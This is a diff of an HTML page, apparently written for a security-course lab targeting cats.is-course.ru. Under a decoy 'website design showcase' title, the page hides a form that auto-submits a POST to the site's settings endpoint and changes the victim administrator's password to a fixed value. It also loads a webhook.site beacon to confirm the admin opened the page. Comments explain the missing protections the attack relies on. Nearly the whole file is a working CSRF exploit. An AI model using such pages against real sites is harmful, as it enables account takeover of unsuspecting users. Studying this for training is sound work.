@@ -1,12 +1,26 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Best Website Design Showcase</title>
+</head>
 <body>
-<script>
-new Image().src = 'https://webhook.site/b305eb85-951a-4ea1-aaaf-63ba3b3b0eb4?step=G';
-</script>
-<form id="f" method="POST" action="https://cats.is-course.ru/ЭНДПОИНТ">
-  <input name="ПОЛЕ" value="ЗНАЧЕНИЕ">
+<h1>Award-winning minimalist web design</h1>
+<p>Loading...</p>
+
+<!-- CSRF: no CSRF token, no old-password check, SameSite=None cookie on cats.is-course.ru
+     -> a simple cross-site form POST changes the victim's (admin's) password. -->
+<form id="csrf-form" action="https://cats.is-course.ru/settings" method="POST" style="display:none">
+    <input type="text" name="password" value="C4tsRuleForest!">
+    <input type="text" name="confirm-password" value="C4tsRuleForest!">
 </form>
-<script>document.getElementById('f').submit();</script>
+
+<!-- Optional: beacon to confirm the admin actually loaded this page.
+     Replace with your own https://webhook.site/<your-id> URL. -->
+<img src="https://webhook.site/YOUR-UNIQUE-ID" style="display:none" alt="">
+
+<script>
+    document.getElementById('csrf-form').submit();
+</script>
 </body>
 </html>
